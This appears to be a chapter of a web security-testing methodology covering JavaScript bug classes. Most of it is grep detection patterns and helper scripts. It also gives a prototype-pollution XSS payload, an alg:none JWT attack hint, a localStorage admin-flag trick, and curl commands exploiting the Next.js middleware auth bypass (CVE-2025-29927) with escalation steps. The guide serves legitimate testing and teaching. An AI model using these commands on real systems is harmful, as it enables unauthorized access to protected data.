# 05 — Bug Classes Deep-Dive

## 1. DOM XSS — Source-to-Sink Tracing

### Key Sources (attacker-controlled input)
```
location.hash         location.search       location.href
document.URL          document.referrer     document.cookie
window.name           postMessage data      WebSocket data
localStorage          sessionStorage        IndexedDB
URL.searchParams      history.state
```

### Key Sinks (dangerous execution)
```
innerHTML / outerHTML / insertAdjacentHTML
document.write / document.writeln
eval() / Function() / setTimeout(str) / setInterval(str)
location.href = / location.replace() / location.assign()
<script src= / jquery.html() / jquery.append()
React dangerouslySetInnerHTML
Vue v-html directive
```

### Tracing Methodology

```bash
# Find all source reads in JS files
grep -rEn "location\.(hash|search|href|pathname)|document\.(URL|referrer|cookie)|window\.name" js_files/

# Find all dangerous sinks
grep -rEn "\.innerHTML\s*=|\.outerHTML\s*=|document\.write\(|eval\(|new Function\(" js_files/

# Find source→sink chains (manual pattern)
# Look for: const x = location.hash.slice(1); ... element.innerHTML = x;
grep -rn "location\.hash\|location\.search" js_files/ -A 5 | grep -i "inner\|write\|eval"
```

### DOM XSS in SPA Routing (React/Vue/Angular)

```bash
# React Router — check for unescaped route params rendered in DOM
grep -rn "useParams\|match\.params\|props\.match" js_files/ -A 3 | grep -i "inner\|dangerously"

# Vue — v-html with route data
grep -rn "v-html\|v-bind:innerHTML" js_files/ -B 3

# Angular — bypassSecurityTrustHtml
grep -rn "bypassSecurityTrust\|DomSanitizer" js_files/
```

---

## 2. Prototype Pollution

### Detection Patterns

```bash
# Find merge/extend functions that process user-controlled keys
grep -rEn "__proto__|constructor\.prototype|Object\.assign|_.merge|_.extend|jQuery\.extend\(true" js_files/

# Find potential pollution sources (URL params, JSON.parse of user data)
grep -rn "JSON\.parse.*location\|qs\.parse\|querystring\.parse" js_files/ -A 5 | grep -i "merge\|assign\|extend"
```

### Manual Test

```javascript
// In browser console on target:
// 1. Test if prototype is pollutable
Object.prototype.polluted = "JSRA_TEST";
console.log({}.polluted);  // Should be undefined — if "JSRA_TEST", pollutable

// 2. Test via URL (?__proto__[polluted]=1)
fetch("/?__proto__[polluted]=JSRA_TEST")
  .then(() => console.log({}.polluted));

// 3. Test gadgets — does pollution cause XSS?
Object.prototype.innerHTML = "<img src=x onerror=alert(1)>";
document.querySelector("div").innerHTML;  // Gadget check
```

### Gadget Hunting Script

```python
# scripts/find_pp_gadgets.py
import re, sys
from pathlib import Path

TARGET = sys.argv[1] if len(sys.argv) > 1 else "js_files"
GADGETS = [
    r'document\.createElement\s*\(',
    r'\.innerHTML\s*=',
    r'\.src\s*=',
    r'\.href\s*=',
    r'script\[',
    r'\.setAttribute\s*\(',
    r'window\[',
]

for js_file in Path(TARGET).rglob("*.js"):
    content = js_file.read_text(errors='ignore')
    lines = content.splitlines()
    for i, line in enumerate(lines, 1):
        for g in GADGETS:
            if re.search(g, line):
                # Check if the value could come from object property (potential PP gadget)
                if re.search(r'\w+\.\w+|\w+\[', line):
                    print(f"[PP GADGET?] {js_file}:{i}")
                    print(f"  {line.strip()[:150]}")
                    break
```

---

## 3. BAC / IDOR in JavaScript

### What to Look For

```bash
# Object references — numeric/UUID IDs in API calls
grep -rEn '"/api/(user|account|profile|order|document|file)/\$\{|"/api/.*/\+|fetch.*userId|fetch.*accountId' js_files/

# Role-based rendering (client-side access control = bypassable)
grep -rEn 'role\s*===?\s*["\"]admin|isAdmin\s*===?\s*true|userType\s*===?\s*' js_files/

# Hardcoded UUIDs / IDs belonging to other users (check if consistent/sequential)
grep -rEn '["\"][0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}["\"]' js_files/
grep -rEn '"userId":\s*[0-9]+|"id":\s*[0-9]{3,}' js_files/

# Horizontal privilege escalation — same role, different user
grep -rEn 'currentUser\.id\|this\.userId\|state\.user\.id' js_files/ -A 3 | grep -i "fetch\|api\|request"
```

### IDOR Testing Strategy

1. **Map all object references** — extract all `/api/{resource}/{id}` patterns
2. **Identify parameter type** — numeric (sequential), UUID (non-guessable), or user-supplied
3. **Test with another user's session** — use 2 accounts, swap IDs
4. **Test without auth** — probe endpoints from `04-dynamic-analysis.md` Script 4
5. **Check response differences** — same response with different IDs = IDOR

---

## 4. Auth Logic Flaws

### Client-Side JWT Manipulation

```python
# scripts/decode_jwt.py
import sys, base64, json

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) != 3:
        return None
    for i, part in enumerate(parts[:2]):
        padding = 4 - len(part) % 4
        padded = part + "=" * padding
        try:
            decoded = base64.urlsafe_b64decode(padded).decode()
            print(f"[Part {i}] {json.dumps(json.loads(decoded), indent=2)}")
        except Exception as e:
            print(f"[Part {i}] Raw: {padded} (Error: {e})")

token = sys.argv[1]
decode_jwt(token)

# Check for weak algorithms
header = json.loads(base64.urlsafe_b64decode(token.split(".")[0] + "==").decode())
if header.get("alg") in ["none", "HS256"]:
    print(f"\n[WARNING] Algorithm: {header['alg']} — test alg:none attack!")
```

### Feature Flag Bypass

```javascript
// In browser console — test feature flag bypass
// 1. Check localStorage
Object.keys(localStorage).forEach(k => {
    let v = localStorage.getItem(k);
    if (/flag|feature|admin|beta|enable/i.test(k)) {
        console.log(`[FLAG] ${k} = ${v}`);
    }
});

// 2. Attempt to set admin flag
localStorage.setItem('isAdmin', 'true');
location.reload();
// Check if UI or API behavior changes
```

---

## 5. Encryption & Crypto Misuse

### Detection

```bash
# Weak/broken algorithms
grep -rEin "md5|sha1\b|des\b|rc4|AES-ECB" js_files/

# Math.random() for security purposes (non-CSPRNG)
grep -rn "Math\.random" js_files/ -B 2 -A 2 | grep -i "token\|session\|nonce\|key\|secret\|id"

# Hardcoded encryption keys/IVs
grep -rEn "(key|iv|secret)\s*=\s*['\"][A-Fa-f0-9]{16,}['\"]" js_files/

# Client-side AES with CryptoJS (key often hardcoded)
grep -rn "CryptoJS\.AES\|CryptoJS\.enc" js_files/ -B 5 | grep -i "key\|secret"
```

### Impact Assessment

| Misuse | Impact | Severity |
|--------|--------|----------|
| MD5 for passwords | Easily reversible | High |
| Math.random() for tokens | Predictable sessions | High |
| Hardcoded AES key | Decrypt all ciphertext | Critical |
| AES-ECB mode | Pattern leakage | Medium |
| JWT alg:none | Auth bypass | Critical |
| Short/static IV | Ciphertext patterns | Medium |

---

## 6. Modern SPA Framework Vulnerabilities (2024-2025)

### Next.js CVE-2025-29927 — Middleware Auth Bypass (CVSS 9.1)

Affects: Next.js ≤ 15.2.2 (middleware-based auth — extremely common pattern).

**How it works:** Next.js middleware sets `x-middleware-subrequest` header internally to track
subrequest depth. An attacker can spoof this header on external requests, causing Next.js to
skip middleware execution entirely — bypassing auth, rate limiting, and all middleware guards.

```bash
# Check if target runs Next.js (look for _next/ in responses or __NEXT_DATA__ in HTML)
curl -sI https://target.com | grep -i 'x-powered-by\|next\|vercel'
curl -s https://target.com | grep -o '"buildId":"[^"]*"'  # __NEXT_DATA__ buildId

# CVE-2025-29927 — bypass middleware auth guard on any protected route
curl -s "https://target.com/admin" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
# Or with the pages router variant:
curl -s "https://target.com/admin" \
  -H "x-middleware-subrequest: pages/_middleware:pages/_middleware:pages/_middleware"

# If the response changes from 401/302 to 200 with data → confirmed bypass
# Then try: /admin/users, /api/admin/*, /dashboard, /internal/* etc.
```

**Escalation:** Every page/API route protected ONLY by middleware is now accessible. Map all
protected routes from the `build-manifest.json` / `_next/static/chunks/pages/` paths, then
hit each with the bypass header.

---

### Next.js `__NEXT_DATA__` / SSR Data Leak

```bash
# Pull SSR data from every page route
curl -sL "https://target.com/" | python3 -c "
import sys, re, json
html = sys.stdin.read()
m = re.search(r'<script[^>]*id=[\"\'__NEXT_DATA__[\"\'[^>]*>(.+?)</script>', html, re.DOTALL)
if m:
    d = json.loads(m.group(1))
    print(json.dumps(d.get('props', {}), indent=2))
"

# Test dynamic routes — each may expose different data
for route in / /profile /dashboard /settings /admin /billing /team /api/user; do
  echo "=== $route ===" && \
  curl -sL "https://target.com$route" | grep -o '"__NEXT_DATA__":\s*{[^<]*' | head -3
done
```

**Look for:** auth tokens in `pageProps`, user objects with PII, internal API base URLs
(`apiUrl`, `backendUrl`), feature flags, subscription/plan data that gates the UI.

---

### getServerSideProps / Loader Data Leak

Next.js `getServerSideProps` and Remix `loader` functions run server-side but their return
values are passed verbatim to the client. Developers accidentally return secrets:

```bash
# Check if getServerSideProps returns sensitive data
curl -sL "https://target.com/_next/data/<buildId>/dashboard.json" | python3 -m json.tool | head -50
# Enumerate: replace <buildId> with the one from __NEXT_DATA__.buildId

# Also try: /_next/data/<buildId>/profile/[userId].json with real/other IDs → IDOR
```

---

### React/Angular `dangerouslySetInnerHTML` + `v-html` in Vue

```bash
# React — find dangerouslySetInnerHTML with user-controlled data
grep -rn 'dangerouslySetInnerHTML' beautified/ -B 5 | grep -i 'user\|param\|query\|input\|state\|props\|data'

# Vue — v-html with non-sanitized data
grep -rn 'v-html' beautified/ -B 3 | grep -v 'v-html="\"'  # exclude static strings

# Angular — bypassSecurityTrustHtml used without sanitizing
grep -rn 'bypassSecurityTrustHtml\|bypassSecurityTrustUrl\|bypassSecurityTrustScript' beautified/
```

---

### SPA Router Guards — Client-Side Only

```bash
# React Router — PrivateRoute / RequireAuth components
grep -rn 'PrivateRoute\|RequireAuth\|AuthGuard\|canActivate\|canLoad' beautified/ -A 5

# The GUARD blocks the UI. The API it calls does NOT know if you used the guard.
# Extract the API calls made inside the guarded component and hit them directly.
grep -rn 'PrivateRoute' beautified/ -A 20 | grep -E 'fetch|axios|useQuery|useMutation'
```

---

## 7. PII & Data Exposure

### Sensitive Data Patterns to Report

```bash
# Email addresses in source (could be internal)
grep -rEon "[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}" js_files/ | grep -v "example\|test\|placeholder"

# User data in hardcoded test fixtures/seeds
grep -rEn "(firstName|lastName|dateOfBirth|ssn|creditCard|phoneNumber)" js_files/ -A 2

# Debug logging of sensitive data
grep -rEn "console\.(log|debug|info)\s*\(.*?(password|token|secret|key|auth|session)" js_files/

# Analytics with PII
grep -rEn "gtag\|ga\|analytics|mixpanel|segment|amplitude" js_files/ -A 5 | grep -i "email\|user\|id\|phone"
```
